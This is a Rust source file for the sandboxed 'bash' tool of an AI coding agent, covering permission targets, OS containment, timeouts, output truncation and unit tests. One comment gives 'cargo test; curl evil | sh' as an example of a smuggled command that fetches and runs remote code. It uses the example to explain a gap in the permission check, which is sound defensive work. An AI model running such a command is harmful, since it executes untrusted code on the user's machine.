//! `bash` — the universal adapter, and the whole security surface.
//!
//! Every other capability a developer has is reachable through here, which is why
//! it is worth having exactly one of these rather than wrappers for git, cargo,
//! and npm. It is also why this is the only tool that runs under OS containment.
//!
//! Three layers apply to every invocation, in order:
//!
//! 1. **Policy** (`octane-permission`) — the loop resolves `command(...)` before
//!    `execute` is ever called. This tool never decides whether it may run.
//! 2. **Containment** (`octane-sandbox`) — the command is rewritten to run under
//!    Seatbelt/Landlock. This is what makes `make test` safe when its Makefile
//!    does something other than run tests.
//! 3. **Bounds** — timeout and output cap, so a runaway cannot hang the session or
//!    flood the context window.
//!
//! If containment is unavailable on the platform, this tool **fails** rather than
//! running unconfined. Silently dropping to no sandbox because the OS is
//! unfamiliar is exactly the failure a sandbox exists to prevent; the user can opt
//! out explicitly with `--no-sandbox`.

use std::process::Stdio;
use std::time::Duration;

use async_trait::async_trait;
use octane_sandbox::{SandboxPolicy, is_likely_sandbox_denial};
use serde::Deserialize;
use tokio::io::AsyncReadExt;

use crate::tool::{Tool, ToolContext, ToolError, ToolOutcome};

pub const DEFAULT_TIMEOUT: Duration = Duration::from_secs(120);
pub const MAX_TIMEOUT: Duration = Duration::from_secs(600);

/// Output cap. Beyond this the model learns nothing more and the context window
/// is the thing being spent.
pub const MAX_OUTPUT_BYTES: usize = 30_000;

/// Kept when truncating: the tail usually holds the error, the head usually holds
/// what was being attempted.
const HEAD_BYTES: usize = 10_000;
const TAIL_BYTES: usize = 20_000;

const DESCRIPTION: &str = "\
Runs a shell command and returns its combined output.

Usage:
- Provide `description`: 5-10 words saying what the command does. It is shown
  to the user when approval is required, so it should describe intent.
- Quote paths containing spaces: cd \"/path/with spaces\".
- Prefer the dedicated tools where they fit — `read`, `write`, `edit`, `glob`,
  and `grep` are cheaper and more reliable than cat/sed/find/rg.
- Each call runs in a fresh shell. `cd` does not persist between calls; use an
  absolute path or chain with && in a single command.
- Avoid interactive commands, which will hang until the timeout. Use
  non-interactive flags (npm init -y, git rebase without -i).
- Long-running processes should be backgrounded, or they will hit the timeout.
- Output is truncated beyond ~30KB. Filter with grep/head rather than relying
  on truncation.";

#[derive(Debug, Deserialize)]
struct Input {
    command: String,
    /// Required, because it is what the user reads on the approval prompt. A
    /// prompt showing only the command text makes the user parse shell to decide.
    description: String,
    #[serde(default)]
    timeout_ms: Option<u64>,
}

pub struct BashTool {
    sandbox: SandboxPolicy,
}

impl std::fmt::Debug for BashTool {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        f.debug_struct("BashTool").field("contained", &self.sandbox.is_contained()).finish()
    }
}

impl BashTool {
    pub fn new(sandbox: SandboxPolicy) -> Self {
        Self { sandbox }
    }

    pub fn sandbox(&self) -> &SandboxPolicy {
        &self.sandbox
    }
}

#[async_trait]
impl Tool for BashTool {
    fn name(&self) -> &str {
        "bash"
    }

    fn description(&self) -> &str {
        DESCRIPTION
    }

    fn input_schema(&self) -> serde_json::Value {
        serde_json::json!({
            "type": "object",
            "properties": {
                "command": { "type": "string", "description": "The command to run." },
                "description": { "type": "string", "description": "5-10 words describing what this does, shown to the user for approval. e.g. 'Runs the test suite'." },
                "timeout_ms": { "type": "integer", "description": "Timeout in milliseconds. Default 120000, maximum 600000." }
            },
            "required": ["command", "description"],
            "additionalProperties": false
        })
    }

    fn required_permissions(&self, input: &str, _ctx: &ToolContext) -> Vec<String> {
        // The full command line is the target, so the policy engine can match
        // token-prefix rules like `command(cargo test)` against it.
        //
        // Note what this does *not* do: it has no idea that
        // `cargo test; curl evil | sh` is two commands. A shell-AST pass belongs
        // in front of this before untrusted use — see RESEARCH.md §2 on Claude
        // Code's parser. Until then the sandbox is what bounds the damage, which
        // is the argument for having both layers.
        match serde_json::from_str::<Input>(input) {
            Ok(parsed) => vec![format!("command({})", parsed.command)],
            // Unparseable input yields no resource; `execute` produces the real
            // error. Returning `command(*)` here would prompt about a call that
            // was never going to run.
            Err(_) => Vec::new(),
        }
    }

    async fn execute(&self, input: &str, ctx: &ToolContext) -> Result<ToolOutcome, ToolError> {
        let parsed: Input = serde_json::from_str(input)
            .map_err(|error| ToolError::Recoverable(format!("invalid arguments: {error}")))?;

        if parsed.command.trim().is_empty() {
            return Err(ToolError::Recoverable("command must not be empty".into()));
        }

        let timeout = parsed
            .timeout_ms
            .map(Duration::from_millis)
            .unwrap_or(DEFAULT_TIMEOUT)
            .min(MAX_TIMEOUT);

        // `-c`, not `-lc`: loading the login profile would make behaviour depend
        // on the user's dotfiles, which is neither reproducible nor safe.
        let shell_command =
            vec!["/bin/bash".to_string(), "-c".to_string(), parsed.command.clone()];

        let sandboxed = octane_sandbox::wrap(&shell_command, &self.sandbox, &ctx.cwd)
            .map_err(|error| match error {
                octane_sandbox::SandboxError::UnsupportedPlatform => ToolError::Internal(
                    "command execution is sandboxed, and no sandbox is available on this \
                     platform. Re-run octane with --no-sandbox to proceed without \
                     containment."
                        .into(),
                ),
                other => ToolError::Internal(other.to_string()),
            })?;

        let (program, args, extra_env) = match sandboxed {
            Some(command) => (command.program, command.args, command.env),
            // Only reachable for DangerFullAccess or ExternalSandbox, both of
            // which are explicit user choices.
            None => (shell_command[0].clone(), shell_command[1..].to_vec(), Vec::new()),
        };

        let mut command = tokio::process::Command::new(&program);
        command
            .args(&args)
            .current_dir(&ctx.cwd)
            .stdin(Stdio::null()) // An interactive prompt should fail fast, not hang.
            .stdout(Stdio::piped())
            .stderr(Stdio::piped())
            .kill_on_drop(true);

        for (key, value) in &extra_env {
            command.env(key, value);
        }

        let mut child = command
            .spawn()
            .map_err(|error| ToolError::Internal(format!("spawning {program}: {error}")))?;

        let mut stdout_pipe = child.stdout.take();
        let mut stderr_pipe = child.stderr.take();

        let collect = async {
            let mut stdout = Vec::new();
            let mut stderr = Vec::new();
            if let Some(pipe) = stdout_pipe.as_mut() {
                let _ = pipe.read_to_end(&mut stdout).await;
            }
            if let Some(pipe) = stderr_pipe.as_mut() {
                let _ = pipe.read_to_end(&mut stderr).await;
            }
            let status = child.wait().await;
            (stdout, stderr, status)
        };

        let outcome = tokio::select! {
            // Ctrl-C must kill the process, not just stop rendering its output.
            () = ctx.cancel.cancelled() => return Err(ToolError::Cancelled),
            result = tokio::time::timeout(timeout, collect) => result,
        };

        let (stdout, stderr, status) = match outcome {
            Ok(collected) => collected,
            Err(_) => {
                return Err(ToolError::Recoverable(format!(
                    "command timed out after {}s and was killed. \
                     Background long-running processes, or raise timeout_ms.",
                    timeout.as_secs()
                )));
            }
        };

        let exit_code = status.ok().and_then(|status| status.code());

        let mut combined = String::from_utf8_lossy(&stdout).into_owned();
        let stderr_text = String::from_utf8_lossy(&stderr);
        if !stderr_text.trim().is_empty() {
            if !combined.is_empty() && !combined.ends_with('\n') {
                combined.push('\n');
            }
            combined.push_str(&stderr_text);
        }

        // Distinguished from an ordinary failure: a sandbox denial cannot be
        // fixed by the model trying harder, so telling it to keep trying wastes
        // turns on a decision only the user can make.
        if self.sandbox.is_contained() && is_likely_sandbox_denial(exit_code, &stderr_text) {
            return Err(ToolError::SandboxDenied(format!(
                "{}\n\nThis looks like the sandbox blocking the command rather than the \
                 command itself failing. Writable paths are limited to the workspace and \
                 network access is off.",
                truncate(&combined).trim_end()
            )));
        }

        let body = truncate(&combined);
        let output = match exit_code {
            Some(0) if body.trim().is_empty() => "(no output)".to_string(),
            Some(0) => body.clone(),
            Some(code) => format!("{}\n\n[exit code {code}]", body.trim_end()),
            None => format!("{}\n\n[killed by signal]", body.trim_end()),
        };

        Ok(ToolOutcome::new(parsed.description.clone(), output).with_metadata(serde_json::json!({
            "command": parsed.command,
            "exit_code": exit_code,
            "sandboxed": self.sandbox.is_contained(),
        })))
    }
}

/// Cap output, keeping the head and the tail.
///
/// The middle is what gets dropped because it is the least informative part: the
/// head shows what was attempted and the tail almost always holds the error.
fn truncate(text: &str) -> String {
    if text.len() <= MAX_OUTPUT_BYTES {
        return text.to_string();
    }

    let head_end = floor_char_boundary(text, HEAD_BYTES);
    let tail_start = ceil_char_boundary(text, text.len() - TAIL_BYTES);
    let omitted = tail_start - head_end;

    format!(
        "{}\n\n[... {omitted} bytes omitted ...]\n\n{}",
        &text[..head_end],
        &text[tail_start..]
    )
}

/// Largest char boundary at or below `index`. Slicing mid-codepoint panics, and
/// command output is arbitrary bytes.
fn floor_char_boundary(text: &str, index: usize) -> usize {
    let mut i = index.min(text.len());
    while i > 0 && !text.is_char_boundary(i) {
        i -= 1;
    }
    i
}

fn ceil_char_boundary(text: &str, index: usize) -> usize {
    let mut i = index.min(text.len());
    while i < text.len() && !text.is_char_boundary(i) {
        i += 1;
    }
    i
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::tests_support::{context, workspace};

    /// Uncontained, so the assertions are about this tool's own behaviour rather
    /// than about the platform's sandbox.
    fn tool() -> BashTool {
        BashTool::new(SandboxPolicy::DangerFullAccess)
    }

    fn call(command: &str) -> String {
        serde_json::json!({ "command": command, "description": "test command" }).to_string()
    }

    #[tokio::test]
    async fn runs_a_command_and_returns_its_output() {
        let (_guard, root) = workspace();
        let outcome = tool().execute(&call("echo hello"), &context(&root)).await.unwrap();
        assert!(outcome.output.contains("hello"));
    }

    #[tokio::test]
    async fn stderr_is_included() {
        let (_guard, root) = workspace();
        let outcome = tool()
            .execute(&call("echo to-stderr >&2"), &context(&root))
            .await
            .unwrap();
        assert!(outcome.output.contains("to-stderr"));
    }

    #[tokio::test]
    async fn a_nonzero_exit_is_reported_with_its_code() {
        let (_guard, root) = workspace();
        let outcome = tool().execute(&call("exit 3"), &context(&root)).await.unwrap();
        assert!(outcome.output.contains("exit code 3"));
        assert_eq!(outcome.metadata.unwrap()["exit_code"], 3);
    }

    #[tokio::test]
    async fn a_failing_command_is_not_an_error_the_model_cannot_see() {
        let (_guard, root) = workspace();
        // A failing build is information, not a tool malfunction.
        let outcome = tool()
            .execute(&call("echo 'error[E0308]' >&2; exit 1"), &context(&root))
            .await
            .unwrap();
        assert!(outcome.output.contains("E0308"));
    }

    #[tokio::test]
    async fn runs_in_the_working_directory() {
        let (_guard, root) = workspace();
        std::fs::write(root.join("marker.txt"), "x").unwrap();

        let outcome = tool().execute(&call("ls"), &context(&root)).await.unwrap();
        assert!(outcome.output.contains("marker.txt"));
    }

    #[tokio::test]
    async fn a_timeout_kills_the_process_and_says_so() {
        let (_guard, root) = workspace();
        let input =
            serde_json::json!({"command":"sleep 30","description":"sleeps","timeout_ms":300})
                .to_string();

        let error = tool().execute(&input, &context(&root)).await.unwrap_err();
        assert!(error.to_string().contains("timed out"));
    }

    #[tokio::test]
    async fn stdin_is_closed_so_interactive_commands_fail_fast() {
        let (_guard, root) = workspace();
        let input = serde_json::json!({
            "command": "read -r line; echo \"got:$line\"",
            "description": "reads stdin",
            "timeout_ms": 5_000
        })
        .to_string();

        // Would hang to the timeout if stdin were inherited.
        let outcome = tool().execute(&input, &context(&root)).await.unwrap();
        assert!(!outcome.output.contains("timed out"));
    }

    #[tokio::test]
    async fn cancellation_kills_a_running_command() {
        let (_guard, root) = workspace();
        let ctx = context(&root);
        let cancel = ctx.cancel.clone();

        tokio::spawn(async move {
            tokio::time::sleep(Duration::from_millis(100)).await;
            cancel.cancel();
        });

        let input =
            serde_json::json!({"command":"sleep 30","description":"sleeps"}).to_string();
        let error = tool().execute(&input, &ctx).await.unwrap_err();
        assert!(matches!(error, ToolError::Cancelled));
    }

    #[tokio::test]
    async fn an_empty_command_is_refused() {
        let (_guard, root) = workspace();
        let error = tool().execute(&call("   "), &context(&root)).await.unwrap_err();
        assert!(error.to_string().contains("empty"));
    }

    #[tokio::test]
    async fn silent_success_says_so_rather_than_returning_nothing() {
        let (_guard, root) = workspace();
        let outcome = tool().execute(&call("true"), &context(&root)).await.unwrap();
        assert_eq!(outcome.output, "(no output)");
    }

    #[test]
    fn the_permission_target_is_the_full_command_line() {
        let (_guard, root) = workspace();
        let permissions = tool().required_permissions(&call("cargo test --lib"), &context(&root));
        assert_eq!(permissions, vec!["command(cargo test --lib)"]);
    }

    #[test]
    fn unparseable_input_requests_no_permission() {
        let (_guard, root) = workspace();
        assert!(tool().required_permissions("not json", &context(&root)).is_empty());
    }

    #[test]
    fn truncation_keeps_the_head_and_the_tail() {
        let text = format!("{}{}{}", "H".repeat(5_000), "M".repeat(50_000), "T".repeat(5_000));
        let truncated = truncate(&text);

        assert!(truncated.starts_with("HHHH"));
        assert!(truncated.ends_with("TTTT"), "the tail usually holds the error");
        assert!(truncated.contains("bytes omitted"));
        assert!(truncated.len() < text.len());
    }

    #[test]
    fn truncation_does_not_split_a_codepoint() {
        // Multi-byte characters straddling the cut points would panic on slice.
        let text = "é".repeat(40_000);
        let truncated = truncate(&text);
        assert!(truncated.contains("bytes omitted"));
    }

    #[test]
    fn short_output_is_returned_unchanged() {
        assert_eq!(truncate("small"), "small");
    }
}
